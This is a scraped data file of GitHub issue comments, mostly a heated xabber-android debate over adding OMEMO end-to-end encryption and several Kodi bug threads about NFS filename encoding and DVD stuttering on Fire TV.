xabber-android/redsolution/540/394163353,"Sorry where I  an delete the part of discussion? Developer we need, they our future. ;-). Von Samsung-Tablet gesendet -------- Ursprüngliche Nachricht --------Von Paul Schaub notifications@friend.com Datum 03.06.18  1448  (GMT+0100) An redsolution/xabber-android xabber-android@friend.github.com Cc heideline hm.hemmelrath@friend.com, Mention mention@friend.github.com Betreff Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)  Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request. @friend Can you later delete this part of the discussion? — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub, or mute the thread. {""@friend"""" Issue""},""description""""View this Issue on GitHub"",""publisher""{""@friend""""Organization"",""name""""GitHub"",""url"""" repository"",""main_image_url"""" in GitHub"",""url"""" in #540 Generally speaking, this is a place to discuss developer problems, specifically implementing a new feature in this case. You do have a user problem. Please seek help from the Xabber Support Team, not on Github. Unfortunately you are kind of making it hard to follow the original topic of this discussion with your request.\r\n\r\n@friend Can you later delete this part of the discussion?""}],""action""{""name""""View Issue"",""url"""" ""MessageCard"", ""@friend"" "" ""false"", ""originator"" ""37567f93-e2a7-4e2a-ad37-a9160fc62647"", ""title"" ""Re [redsolution/xabber-android] Add support for OMEMO Encyrption (#540)"", ""sections"" [ { ""text"" """", ""activityTitle"" ""Paul Schaub"", ""activityImage"" "" ""@friend"", ""facts"" [ ] } ], ""potentialAction"" [ { ""name"" ""Add a comment"", ""@friend"" ""ActionCard"", ""inputs"" [ { ""isMultiLine"" true, ""@friend"" ""TextInput"", ""id"" ""IssueComment"", ""isRequired"" false } ], ""actions"" [ { ""name"" ""Comment"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueComment\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540,\n\""IssueComment\"" \""{{IssueComment.value}}\""\n}"" } ] }, { ""name"" ""Close issue"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""IssueClose\"",\n\""repositoryFullName\"" \""redsolution/xabber-android\"",\n\""issueId\"" 540\n}"" }, { ""targets"" [ { ""os"" ""default"", ""uri"" "" ""OpenUri"", ""name"" ""View on GitHub"" }, { ""name"" ""Unsubscribe"", ""@friend"" ""HttpPOST"", ""target"" "" ""{\n\""commandName\"" \""MuteNotification\"",\n\""threadId\"" 98784137\n}"" } ], ""themeColor"" ""26292E"" } ",,False,False,540
xabber-android/redsolution/540/394164444,"Wtf happened here? @friend could not you please delete the comments added by @friend, which have this huge bunch of email stuff there? And yeah, I'd also suggest to close this issue here. (maybe even lock it – it may be better wink) You seem to not want to implement it, or better can't, because of the legal things discussed before, so leave it as it. Users wanting to use OMEMO should use a different client. And I better unsubscribe this issue… ",,False,False,540
xabber-android/redsolution/540/394176494,"All users should use other client, as thankfully E2E encryption is finally starting to be enabled by default, so this client is starting to be incompatible with modern clients such as Conversations. ",,False,False,540
xabber-android/redsolution/540/394177898,"@friend yeah, Conversations users were very happy when they were forced to have that e2e bullshit forced on them. Processone even changed default config in so OMEMO encryption in Conversations wouldn't work out of the box in ejabberd. ",,False,False,540
xabber-android/redsolution/540/394178489,"I was not Converastions user before OMEMO was turned on by default by I am one now and I am very happy that it is forced on users. Unfortunately not everyone cares about e2e and that is fine when two such people communicate. But it is a pain to explain to people how to configure and/or use it as a person who actually cares about privacy. So yeah, even companies like Whatsapp got the memo and enabled e2e by default. And XMPP, which should have been leading the charge is lacking behind, because all the developers can't agree about anything except basic message sending. Here it is OMEMO, Conversations don't want to implement eCards because I don't know... It is ridiculous. I am not surprised XMPP never caught on. ",,False,False,540
xabber-android/redsolution/540/394179491,"@friend if you care about privacy, run your own server and communicate within it. The only persons e2e helps against are admins of yours and your chat buddy's servers. But while encryption brings users a false sense of security it also breaks a lot of things that are really important in real life, like server-side history search and device convergence. ",,False,False,540
xabber-android/redsolution/540/394184167,"So you want to keep all your very safely transmitted messages decrypted on your pocket device? Lol. So if it gets lost, stolen or taken from you, whoever gets access to device will have all your data. So by trying to eliminate one security risk you introduce many others much more severe. What you don't get is that security and convenience don't fit together well. Encryption nerds lull themselves to be safe because they pressed some magic buttons in some app, only to get hacked via some security hole totally not related to message encryption protocol. Heard about that recent Signal code injection bug? ",,False,False,540
xabber-android/redsolution/540/394182294,"First of all, e2e if done right is the only thing that can even start to provide some security. What would be the point? I would not trust myself to run it properly. All my friends would have to use my server or their own, both of which is impractical. The server can't be at my home because village internet and having it at a datacenter ruins the point. I really don't understand how it breaks device convergence and modern devices are powerful enough to run client-side searches, so who cares. ",,False,False,540
xabber-android/redsolution/540/394250224,"I don't get why you are still discussing. If you read the backlog, you can see that both sides already brought every point up against each other. Xabber devs are not going to implement OMEMO in Xabber by themselves, no matter what great arguments you bring up. If you want OMEMO in Xabber, fork it and do it yourselves ) Xabber is based on Smack and Smack does have a module for that. ",,False,False,540
xabber-android/redsolution/540/394254525,@friend money is good enough argument. I think we could do this for just 1₿ ;) ,,False,False,540
xabber-android/redsolution/540/394234490,"First of all, if nothing else, FDE. Second of all, what the hell is your point? Yes, if someone can walk up to me and get my device, they will get my messages, whether they are e2e encrypted or not as long as I store them (which I don't have to do for the sensitive ones). But for one, I can delete them and be reasonably sure they are deleted unlike with servers, which I can only hope they are doing something. And walking to me and taking my phone is a one time thing. With unencrypted messages, they can monitor them long term. As for code injection bug, sure. How does not encrypting messages prevent that? OPr should we just give up, because once in a while, there is a one time bug that almost no-one will be affected by? ",,False,False,540
xabber-android/redsolution/540/394267328,"And once more, attacks on server are many many times easier than on your phone.  Who told you that? Did you ever think that all your assumptions are based on wrong ideas? It does if you care to do some things to prevent access to message history. We actually implemented it for one of our customers, who really cares about security, and does not only pretends to be caring like most folks here. Speaking of spreading bullshit, that's exactly why I respond to all this massive outcry to encrypt everything instead of locking it down. Desire to encrypt everything is silly, and most sane developers know this, except those few who promote it as the main feature of their applications. btw, I wonder if all emails on that Gmail mailbox of yours are encrypted too, or is your e2e crusade  targeted only at chats? ",,False,False,540
xabber-android/redsolution/540/394253476,"That can be quite routinely unlocked by any party that is really interested in getting what's inside. Encrypting database is a bit better, we do it for one of our customers. Point is that crypto-fetishists like the feeling of being secure, but when talking about providing themselves real security, nope, that's too hard to keep own server and control all communications. You introduce many more security risks to disclosure all your preciousss data to a potential attacker (or thief) by carrying it with you all the time, but you choose to be oblivious to those risks, pretending instead that e2e is the final solution to privacy (while running this perfectly secure messenger on an Android phone). And because real security is too damn hard and requires discipline and dedication, users don't really want that, opting for a cosy feeling of being safe. ",,False,False,540
xabber-android/redsolution/540/394262038,"I specifically said the opposite, that it is just the first step. And once more, attacks on server are many many times easier than on your phone. Having them on the server does not protect them unless you log out every time you close the app. It is irrelevant to whether e2e should be used, as this can be solved by encrypting the database. I honestly don't care much. I gave up on xabber as I wrote. I just thought I should reply here to prevent someone from buying the anti-encryption BS that is spreading around. E2E is not the whole solution, but it is certainly part of it. The most important first step, as while E2E does not provide perfect security by far, it decreases your attack surface massively. ",,False,False,540
xabber-android/redsolution/540/394461270,"@friend no excuse, really? Just one thing, like the capability to have a nice history search in a web client, is a deal breaker for almost anyone who does some real work with XMPP. ",,False,False,540
xabber-android/redsolution/540/394413385,"You misrepresent what I wrote. I have PGP set up and my PGP key published, ready to send or recieve encrypted mail. I just deem it ""unreasonably hard"" to ask other people to use it when there is a better solution (IM). I am certainly not ashamed to ask everyone to use IMs that are encrypted by default, as that is literally ZERO effort on their side. There is no excuse not to use encrypted IM these days, as there is virtually no inconvenience (if well implemented). That is my point. ",,False,False,540
xbmc/xbmc/14675/431998189,Have you enabled Whitelisting? Also you did not follow our issue template ,,False,False,14675
xbmc/xbmc/14675/372711120,"Auto framerate change broken in Kodi 18. When I play 1080/50i video in Kodi17, it's change framerate on TV. There is nothing happens in Kodi 18, both x32 and x64. Fullscreen mode (not windowed) and autochange are enabled in settings. But fullscreen mode not work too, it's look like windowed mode forced. There is no ""SetFullScreenInternal"" in Kodi 18 log, like in 17. kodi17.log kodi18.log ",,False,False,14675
xbmc/xbmc/14675/432125234,"you realize that v18 is still not released, right? When implementing the whitelist approach (because of user demand) we decided to do some additional changes to prevent your issue, but unfortunately forgot about it after the feature got in (so many things had been going on in that time). So 👍 for the reminder and 👎 for not writing a proper bug report using our template and another 👎 for your last comment. ",,False,False,14675
xabber-android/redsolution/540/394662451,"@friend Great, so somehow we got from it being useless and bad for security all the way to, it disables one feature and only in webclients, who can't easily do OMEMO properly anyway... Are you trying to argue something or just throwing stuff around? ",,False,False,540
xabber-android/redsolution/540/394668241,"@friend I never told it's totally useless. But the desire to force everyone to press a magic button and pretend they are totally safe and secure is silly. It also breaks not 'one feature' but a number of killer features, like good device sync and server search, which are of paramount importance. And downloading all history from a server to client perform a search is not just stupid, but ultra-stupid. Anyway, you are totally free to do whatever you like, use whatever products you like, create whatever software you like, just don't try to press me into buying this bullshit about e2e and infect me with this crypto-cancer. For any capable user who really cares about security absolutely same security level can be achieved by running own server without e2e, all without losing all the other features we're working on. And I'll go on creating software as I like it and as my customers require it - and so far we didn't have any customers who would pay us for development of OMEMO in Xabber. You see, there is no real market demand for that, unlike, say, iOS version of Xabber, proper group chats or voice and video calls and fast device synchronization that we're working on now. Hope that makes my argument clear. Official public offer Anyone who wants us to add OMEMO functionality to Xabber for Android should pay us 1 bitcoin. Adding it to iOS and Web version would cost additional 0.5 bitcoin each. With this, I'm locking down this thread until further notice. ",,False,False,540
xbmc/xbmc/14809/377832987,"   Bug report Describe the bug I can't play some mp4 and vob files. Files are not corrupted.     Your Environment Used Operating system    [x] Android [ ] iOS [ ] Linux [ ] OSX [ ] Raspberri-Pi [ ] Windows [ ] Windows UWP  Operating system version/name  Kodi version 18 rc1   note Once the issue is made we require you to update it with new information or Kodi versions should that be required. Team Kodi will consider your problem report however, we will not make any promises the problem will be solved. ",,False,False,14809
xbmc/xbmc/14675/432002406,Jeez stop whining.  With that attitude no one will care to even try to improve it. Also no one forced you to update so you can of course blame yourself ,,False,False,14675
xbmc/xbmc/14809/436266809,Please read  how to submit logfiles. ,,False,False,14809
xbmc/xbmc/14809/436754465, is one whish I can't play. ,,False,False,14809
xbmc/xbmc/14809/436243295,"I don't know how to upload log from Shield device. I need some time to upload files. wt., 6 lis 2018, 1355 Martijn Kaijser notifications@friend.com napisał(a) ",,False,False,14809
xbmc/xbmc/14809/436242639,Where's the debuglog that was asked and sample files? A screenshot is useless ,,False,False,14809
xabber-android/redsolution/540/394321258,"@friend thank you for proving my point with your own confession. Everything you write boils down to this you yourself preach encryption everywhere, yet, you yourself use in only when it is convenient enough (or ""not unreasonably hard""). And, since e2e is convenient enough for you, you want to force everyone to your level of convenience, and you don't really care if they want it or not. That, my friend, is hypocrisy. You see, I don't totally oppose the idea of encryption. It should be used when it is appropriate. It is nicely done in best messaging service out there - Telegram. It uses 'super reliable encryption' as it's marketing gimmick, yet, users love Telegram, not for their encrypted chats (that don't even work across all platforms, by the way), but because it works seamlessly on all their desktops, tablets and browsers, because you can search history, because it has great group chat experience. All of this is possible only because Telegram does what WhatsApp and Viber do not try to do (for reasons beyond my understanding) - it stores all users archives on central servers. And encrypted secret chats are used very sparingly in it, only when specifically enabled. That is a sane model that merges security and convenience in a good enough proportion, and users like it. That's what we're going to build too, one day. And you are pushing everyone to use e2e whether they like it or not. ",,False,False,540
xabber-android/redsolution/540/394311659,"targeted only at chats? I have PGP set up for email, but I practically never use it, because it is more convenient to switch to a secure IM. Using PGP for mail is just unreasonably hard and there is no reason not to use IM (use best tool for the job). Maybe I am not a sane developer, but I don't believe this. Maybe my assumptions are wrong or maybe yours are. Yes, but I never found a flaw in them. But considering you seem to be knowledgeable in the topic, you can point out my error if you see any. Here are my asumptions  There is no practical way a server can improve security in case of device compromise beyond what encryption can do. Reasoning for that is The only security feature reliant on server I ever heard of in connection with IM is protecting the chat history with additional passphrase. This can be done using encryption for example like this. Let Km be master key derived from sufficiently strong passphrase by sufficiently slow KDF. Let K0 be randomly generated key. Store K[0] in file encrypted by Km. Generate future keys K[i] = H('1' + K[i-1]). Generate K[1] and destroy K[0] (form memory). Keep n starting from 1 as message counter. When a message is supposed to be protected by passphrase (is old enough), encrypt it with K[n], generate K[nplus one] and store it. Throw away K[n].  Increment n. Your messages are encrypted and you need to enter the passphrase to decrypt them. To optimize this, after decrypting them for the first time, you can store them in the file encrypted by Km directly and replace K[0] with the current K[n] (+ increment the current n). This is just as resistant to device compromise as server side protection. If a malware is inserted, it can gain future messages in both cases and if passphrase is entered into infected device, it can be captured in both cases. Old messages can't be retrieved from stolen device without passphrase in both cases. Of course there may be other features I never heard of. If there are, please name at least one. But even then, they are not much use if they are not commonly implemented.  Trusting server in addition to the client (phone) creates new attack vector and therefore increases the attack surface. E2Ee mitigates this, as the server does not have to be trusted.  The assumptions 1 and 2 together mean E2Ee can only improve security, not weaken it.  Regular users who don't know a server provider can't verify providers trustworthines.  Only very few users (insignificant amount) have the skills, resources and time to run their own server. I don't believe I would be able to keep up with all the latest in security of servers let alone pay for all the equipment and SW such as firewalls, IDS... Even then, it is a lot of spent time and resources for something that can be better achieved by E2Ee.  Assumptions 4 and 5 together mean, that most users can't trust the server they use.  Even users running their own server securely can't easily trust the server of the other communicating party.  If trust is ever eroded in the server for some reason or just plainly better option arisses, it is not trivial to move to a new server as all your contacts need the new ID and you need to changed it wherever it is shown (which if it is somewhere written down in physical format may be near impossible).  Having a secure server only adds security to E2E scheme, it is not mutually exclusive. You can for example store the encrypted chat history on a server to further secure yourself (both server authentication and encryption would have to be broken to obtain your message history).   ",,False,False,540
xbmc/xbmc/14809/437080565,@friend your files simply cannot be accessed ,,False,False,14809
xbmc/xbmc/14809/436761173,Which kodi version do you use? ,,False,False,14809
xbmc/xbmc/14809/436761310,"kodi 18 latest nightly. without a debug log, nobody can help you! ",,False,False,14809
xbmc/xbmc/14809/437082475,I can play few files from this folder and few don't. I know know what's going on. In kodi 17 I'm able to play them all. So where should I look for solution? In pc NFS share settings? ,,False,False,14809
xbmc/xbmc/14809/436775360,"Could we please see a debuglog, now? You could also use the Logfile Uploader add-on to do so. That simply takes only a few moments. We can't help you without that Logfile and your issue might get closed without it. Thanks in advance ",,False,False,14809
xbmc/xbmc/14809/436267522,"Ok thank you. BTW I'm able to play those files on kodi 17. wt., 6 lis 2018, 1515 DaVukovic notifications@friend.com napisał(a) ",,False,False,14809
xbmc/xbmc/14675/432002108,"WTF is Whitelist ? Why it's empty by default ? Where it placed ? Why google not found it ? Why you broke years-worked setup and add hidden 'feature' and there is no information or attention in download section about this incompatible issue ? You can warn users in ""Download"" section, you can warn users on installation phase, you can open whitelist tab on first run, you can show some window on playstart with attention ""This resolution and framerate not in whitelist, do you want to add now?"" Instead, you simple do nothing, and every user spent weeks to find this error or to rollback to previous version. Too bad, Kodi, too bad. ",,False,False,14675
xbmc/xbmc/14809/437086846,"I think this can be better taken to the forums, perhaps somewhere there can help you track down your NFS issues. ",,False,False,14809
xbmc/xbmc/14809/437087225,"@friend had similiar problems in 2012 with, just found an old support ticket, ",,False,False,14809
xbmc/xbmc/14809/437569197,"Post a log for both please. Am Sa., 10. Nov. 2018, 0941 hat kolunio82 notifications@friend.com geschrieben ",,False,False,14809
xbmc/xbmc/14809/437568490,I tested on the shame shield tv device in the same my home network. Only change is replace kodi 18 to 17 from Google play. ,,False,False,14809
xbmc/xbmc/14809/437088144,I use hane winnfs server and I'm almost sure that settings are fine. ,,False,False,14809
xbmc/xbmc/14809/437560218,"Rather looks like your setup as it works for others using NFS. Am Fr., 9. Nov. 2018 um 2231 Uhr schrieb kolunio82  notifications@friend.com --                     Key-ID     0x1A995A9B                keyserver pgp.mit.edu  ============================================================== Fingerprint 4606 DA19 EC2E 9A0B 0157  C81B DA07 CF63 1A99 5A9B ",,False,False,14809
xbmc/xbmc/14809/437584916,"this one, right nfs//192.168.1.31/z/movies/MUSIC/Ti�sto - Live @ Tomorrowland 2017 (1080p_25fps_H264-128kbit_AAC).mp4 ? Wondering if � has something to do with it in comparison to v18 log @friend If you rename this one to Tisto - Live at Tomorrowland 2017.mp4 does it start to work? ",,False,False,14809
xbmc/xbmc/14809/437587709,Nope crashes to desktop. ,,False,False,14809
xbmc/xbmc/14809/436760473,"hello, just downloaded you file and its playing fine. (Nvidia Shield - OS Ver 7.1 - Oreo 8.0) do you have access from your pc to the shield? then go to this folder internal\Android\data\org.xbmc.kodi\files\.kodi\temp - there is the log ",,False,False,14809
xbmc/xbmc/14809/437083928,"NFS3ERR_NOENT(-2) means file not found, or like Irusak said, its not accessable. this could mean wrong rights or files are moved somewhere. when i told you its working for me, i tried that too over NFS from my nas with NFS V3 ",,False,False,14809
xbmc/xbmc/14809/437591147,Ok I know what is wrong but I don't know how to fix this. When filename contains other letter than from English I can't play the file. I replace Tiësto to Tiesto and it works. ,,False,False,14809
xbmc/xbmc/14809/437591198,"@friend i have downloaded this file and tested on my shield, file location is on qnap nas with nfs. for me its working.. @friend  i think its logcat he wants, download adblink and enable in shield under developer options network-debugging. then  with adblink open ADB shell. logcat -d -f /scdard/logcat.txt ",,False,False,14809
xbmc/xbmc/14809/437591320,"@friend good - this is what I asked you above. So in short we have an issue with passing the ""correct"" encoding so that it is understood by the other side ... @friend logcat is not needed. The error is clear now. It's this  ",,False,False,14809
xbmc/xbmc/14809/437591608,So there is a easy way to fix this? I tried to change language settings in kodi but doesn't work. Also I tired to change filenames display mode in server settings from UTF-8 to windows ansi. But when I change to ansi kodi doesn't see files with others characters at all. ) ,,False,False,14809
xbmc/xbmc/14809/437592475,"@friend ok, its the ë that couse this problem....but why is it working for my nvidia shield with android and qnap nfs? i did not renamed the file ",,False,False,14809
xbmc/xbmc/14809/437592213,"Nope - no easy fix. I pinged the guys on IRC. Let's see ... still wondering why it only misbehaves on Android and other kodi v18 work with the same NAS. I did not expect that this is ""platform specific"" code. ",,False,False,14809
xbmc/xbmc/14809/437592722,You really ask? -) ... It's Microsoft on the other side ... ,,False,False,14809
xbmc/xbmc/14809/437588117,"Mmh - works from non Android kodis, right? If you could provide an adb log that would be really helpful ",,False,False,14809
xbmc/xbmc/14809/437620120,is you server on latest version? ,,False,False,14809
xbmc/xbmc/14809/437620295,"ok, then you have to wait, until fritsch talked to the guys on IRC. @friend why do you think the problem is only on android. did i miss something here? ",,False,False,14809
xbmc/xbmc/14809/437620820,I don't think this is only android problem. Tomorrow I will try kodi 18 on windows 10 and I'll let you know. ,,False,False,14809
xbmc/xbmc/14809/437501526,I tried today kodi 17 from Google play on shield tv and on my smartphone. On both devices I can play those files without any problems. So there is something wrong in nfs share support implementation in kodi 18. ,,False,False,14809
xbmc/xbmc/14809/437621266,"I don't think it is only Android, but for now no one told differently. So based on the information in this bugreport it's Android + Windows NFS for now - in this combination. It even worked with just ""changing"" the NFS server to a QNAP one. So most likely it won't work with kodi v18 on Windows as well in combination with THIS nfs server. We will see. As I neither use Microsoft Windows nor Android with a Windows NFS - I cannot really reproduce. ",,False,False,14809
xbmc/xbmc/14809/437594546,So the question is why KODI 17.6 can play those files and KODI 18 don't. ) ,,False,False,14809
xbmc/xbmc/14809/442023714,"Did you test that already? If so, what was the result and where is the matching debuglog then? ",,False,False,14809
xbmc/xbmc/14809/437592765,") ok i understand, thank you ",,False,False,14809
xbmc/xbmc/14809/442095040,Latest kodi build win x64.   with english characters works. Withs any others than english don't. ,,False,False,14809
xbmc/xbmc/14809/442593359,Why bug is marked as invalid? I had still this problem in kodi windows and in kodi Android. ,,False,False,14809
xbmc/xbmc/14809/441974239,So I still have this problem and It's not fixed. ,,False,False,14809
xbmc/xbmc/14809/442935570,Forgive me please but I don't understand exactly what should I do now? I posted log from kodi Android and kodi windows 10 and I'n both of them I have the same problem. So I should ask people on forums if they have the same problem as I? ,,False,False,14809
xbmc/xbmc/14809/445919361,"What is the link to your forum thread you opened so we can help you find enough info to fix it  - (whether that is in hanewin or in Kodi does not matter really ) I offered help a few times and said there is not enough info for this ticket. I have been nothing but clear about the need to open a thread on the forum for this, so the issue can be reproduced. You keep posting partial (and not nearly enough) information here, and now have added a more than unwelcome negative attitude on top of it. I'll give you a last chance to open a forum thread and link to it here. After that I will simply close communication as I prefer not to deal with people who are not willing to work together  to solve an issue. ",,False,False,14809
xbmc/xbmc/14809/442931616,"I marked it invalid 21 days ago and told you to go to the forums. Until we verify this is an actual Kodi bug, it really has no place here. That being said, on the forums there will be most likely some people willing to assist. ",,False,False,14809
xbmc/xbmc/14809/442939107,"You should go there, open a thread and ask people to help you troubleshoot why your NFS server has incompatibility with Kodi 18. For reference, myself and loads of others are opening files with crazy characters from all kinds of NFS servers with Kodi 18. You haven't convinced us it is not a bug with haneWin. (I would say we are only getting more and more convinced it is.) We can definitely help you troubleshoot why it becomes visible in 18 and not 17 though - for this you will likely need to do a lot more testing, so prepare your debug logs. It would also be extremely valuable if someone could reproduce the bug and help you troubleshoot. The forum is the place to do this - especially since every comment here spams everyone involved. Github issues is not a replacement for the support forum - it is for technically reporting errors with Kodi code that need to be fixed. ",,False,False,14809
xbmc/xbmc/14809/445912985,"From HaneNFS serwer author ""tested an elder VLC on Andorid 4.4 and the latest vlc version on Android  8.0 without any problems. I also verified that non ASCII characters are  ok in VLC on Android. Best regards, Herbert Hanewinkel"" So if HanesNFS works without any problems as nfs server for VLC answer for me is obvious - kodi is responsible for error. Another proof is that kodi 17.6 works fine and 18 don't. Fix your software and don't blame haneNFS. ",,False,False,14809
xbmc/xbmc/14809/445923973,I've done this arleady -  I show you video with error step by step -  should I give you more? ,,False,False,14809
xbmc/xbmc/15405/459977839,Out of curiosity I installed Kodi 18.0 on my phone (Moto G6 plus running Android 8.0) and my tablet (Google Pixel C running Android 8.1). I was not able to reproduce the problem there. So it seems that the issue is related to the Amazon Fire TV. ,,False,False,15405
xbmc/xbmc/15405/460048909,"Well, now you have me screaming and shouting ... How about a switch like ""Disable Mediacodec when playing DVDs""? ",,False,False,15405
xbmc/xbmc/14809/445929175,"Nothing. This ticket is closed for communication, and we can reopen it when we have enough information collected (through the thread) to actually fix something - if the issue is indeed in Kodi. EDIT I just looked at your thread and it contains even less information than the sparse information in this ticket. I suggest you reread everything I said so far, and create a support thread in the forum, or edit your previous thread and forum title. Post as much information as you can in it and hope someone can reproduce it. I will reiterate it once more We can not reproduce the issue with any normal NFS setup so far. It is cool you got someone to test another app and this NFS server, but it is no definitive answer. To highlight this   several of our team tested the same app and another NFS server and there are no issues either. This means there is some weird incompatibility specific between HaneWin NFS with your settings in it + Kodi 18 with your settings in it. This will require a lot of testing on your part. ",,False,False,14809
xbmc/xbmc/15405/405995848,"Bug report Describe the bug I am running Kodi 18.0 as a fresh install on an Amazon Fire TV 3rd gen (2017). When I try to play DVD files (VIDEO_TS.IFO) the movie stutters. It doesn't matter if I install over 17.6 or uninstall 17.6 beforehand for a fresh install. It doesn't matter if I play from SMB (Gigabit ethernet, so no speed problem) or from a local directory (/sdcard/Movies). This worked fine with Kodi 17.6 before. Other movie types (i.e. MKV) are running fine. Expected Behavior DVD videos play smoothly. Actual Behavior DVD videos start to play, then stutter. Audio stutters a little later (after 10 seconds). To Reproduce Steps to reproduce the behavior  Use Amazon Fire TV 3rd gen (2017) Copy a DVD structure below /sdcard/movies AUDIO_TS VIDEO_TS VIDEO_TS\VIDEO_TS.IFO VIDEO_TS\VTS_01_0.IFO VIDEO_TS\VTS_01_1.VOB VIDEO_TS\VTS_01_2.VOB ... Install Kodi 18.0. Add /sdcard/movies as Data source Play the movie. It stutters.  Debuglog The debuglog can be found here  Environment Used Operating system  [x] Android  Operating system version/name Amazon AFTN with Android 7.1.2 API level 25  Amazon software version Fire OS 6.2.5.8 (NS6258/1607) Kodi version 18.0 Git20190128-d81c34c  ",,False,False,15405
xbmc/xbmc/15405/459979533,"Jep - mediacodec is as stable as the vendor implementation -) On your FireTV try to disable ""Mediacodec and Mediacodec Surface"" before playing the DVD please. Don't forget to turn it on again afterwards. ",,False,False,15405
xbmc/xbmc/15405/459987125,"No - in v17. Mediacodec was disabled by default for DVDs. Some forum users forced us to enable it by default - screaming loud and shout, you know. ",,False,False,15405
xbmc/xbmc/15405/460053275,Nope - we rather want that FireTV people just fix their decoder -) ... and this won't happen if we add workaround after workaround. ,,False,False,15405
xbmc/xbmc/15405/460066231,We can expect a lot of thing from Amazon. We also expect users to understand why we do certain things (do not workaround broken firmware by adding stupid switches).  We did not make the decision for you to buy an Amazon device that has clearly not been designed to play such files. So i suggest to find some other device then. ,,False,False,15405
xbmc/xbmc/15405/460070381,"Your argumentation is fully correct. Perhaps amazon did not even try to fix it, cause we had it off in the past ... pure speculations. I don't like when users suffer though. Okay with a custom v18 build that disable Mediacodec for mpeg-2? ",,False,False,15405
xbmc/xbmc/15405/460069101,"Actually, we are at a point where a perfectly working feature has been removed from Kodi between 17.6 and 18.0. I prefer to not throw around the word ""stupid"" but deleting something that made Kodi work out of the box for anything thrown at it and instead have users fiddle around in advanced settings does not look like a completely mature and understandable decision to me. I do not know how I deserve to be treated in that manner. I asked politely about the circumstances and after I read the facts that have been told here I asked politely to add a switch that brings back a deleted feature. Also I disagree about the FireTV ""clearly not been designed to play such files"". Kodi on FireTV played them perfectly until 17.6. It does play them perfectly in 18.0 if I fiddle around in advanced settings. My request is to reduce the necessary fiddling. The Wiki ( says ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."" That sounds like the mere definition of ""FireTV"" to me. We all know that Android is a heterogeneous market. Nearly every device has this or that shortcoming. No reason to throw the FireTV out of the window. ",,False,False,15405
xbmc/xbmc/15405/460065694,"Im sorry, but I disagree. you can't expect Amazon to fix something they don't have any reason to consider broken. From their point of view anything not working in Kodi on FireTV is fine. FireTV is a vehicle to sell more Amazon content, not a friendly and cooperative environment to run things that tend to sell less Amazon content. Obviously this Mediacodec topic is a thing that makes people unhappy. Some want in on by default, some want it off by default. I propose to have it on by default unless the content is a DVD. That seems to be what it was before Kodi 18 and I never even noticed its existence - it just worked. Now it is on by default and I am forced to switch it off manually when playing DVD content. So by removing a ""workaround"" (I would prefer to call that a ""feature"") you force me to manually toggle a switch that is hidden in the advanced settings - probably for good reasons. I would prefer not having to fiddle around in settings every time I change the type of content I intend to play. Please reconsider my request to introduce a setting ""Disable Mediacodec when playing DVDs"". It doesn't look like a complicated thing to implement. ",,False,False,15405
xbmc/xbmc/15405/460070991,Here  - results will be called androidswmpeg2 - it will (other than the name tells) stop dvd acceleration for mediacodec - result is uploaded here  in some minutes. ,,False,False,15405
xbmc/xbmc/15405/459981220,"This indeed helped. Thank you. I am sorry but I fail to make sense of this.  If ""Mediacodec"" is something within Kodi then Kodi 18 introduced a bug that wasn't present in 17.6. In this case a reference to the vendor implementation would not apply. If ""Mediacodec"" is something within Fire TV then it is still the same as it was with Kodi 17.6. Why would it be less stable when used with Kodi 18.0?  ",,False,False,15405
xbmc/xbmc/15405/460157334,I'm probably facing the same issues as Robert Dahlem on my Beelink GT1 with stuttering dvds. I'll try the test build and will report the results later. ,,False,False,15405
xbmc/xbmc/15405/460194751,I tested kodi-20190203-6958f4c5-androidswmpeg2-armeabi-v7a.apk as fresh install as well as installed over my 18.0 configuration. It plays DVDs perfectly without stuttering now. Thank you! ,,False,False,15405
xbmc/xbmc/15405/460277963,"I can disable for mpeg4 &lt; 720 width again. Will upload a tesbuild tonight. Am Mo., 4. Feb. 2019, 1325 hat Markman-B notifications@friend.com geschrieben ",,False,False,15405
xbmc/xbmc/15405/460231280,Playing dvds works fine in this version. I only had to change a system setting for DTS sound to work correctly. ,,False,False,15405
xbmc/xbmc/15405/460224422,"I also have the same problem but on .avi files (mpeg4 - xvid codec). Disabling mediacodec works fine (stuttering is gone) - But more cpu load and way more battery usage coz of disabling hardware acceleration. Also tested that Kodi build from @friend - but didnt solve my problem (sure, its another codec). But generally with the build from @friend other codecs are playing better (I think) - less cpu load on activated hardware acceleration Edit Android 8.1 (non rooted) Google Nexus 5x Problem recognized since Kodi v.18.0 (clean installed w/o any plugins from google play store) ",,False,False,15405
xbmc/xbmc/15405/460309548,"No problem. Let's try. Am Mo., 4. Feb. 2019, 1606 hat MisterT87 notifications@friend.com geschrieben ",,False,False,15405
xbmc/xbmc/15405/460282077,Nice thank you (just for interest the only mpeg4 files I have tested was SD quality). So like mpeg2 before - you only disable hardware acceleration for this two codecs ? Is there anyway to fix later ? Sure the problem is gone for now but the downside is more battery usage (cpu load). So i think for future proof is to fix it not only disabling it or is there some misunderstood of me ? EDIT I am not that Android pro and not familiar with android coding and so on... ,,False,False,15405
xbmc/xbmc/15405/460366724,Will result in very same folder in roughly 60 minutes. More I cannot do for you. Bye -) ,,False,False,15405
xbmc/xbmc/15405/460533058,"Thx. That will fix everything. EDIT it's on Kodi test servers... Yes that works nicely for 720x576 SW decoding and rendering, but All acceleration options have gone missing in Kodi settings. That whole section is missing. ",,False,False,15405
xbmc/xbmc/15405/460318339,sure - can you link it here if build is ready ? ) ,,False,False,15405
xbmc/xbmc/15405/460575735,"Ok, cool. PR inbound to test shortly. Done. ",,False,False,15405
xbmc/xbmc/15405/460573862,"No time. Feel free to fix it up or send a PR. Remember Android specific settings should not bloat settings.xml which is why I tried to move it to android.xml where it's place is Whenever you send a PR to my repo I will start a build. Am Di., 5. Feb. 2019, 1036 hat wrxtasy notifications@friend.com geschrieben ",,False,False,15405
xbmc/xbmc/15405/460571108,@friend can you try this instead for SW decode &amp; settings options  to runtime test on AML Linux Leia... ,,False,False,15405
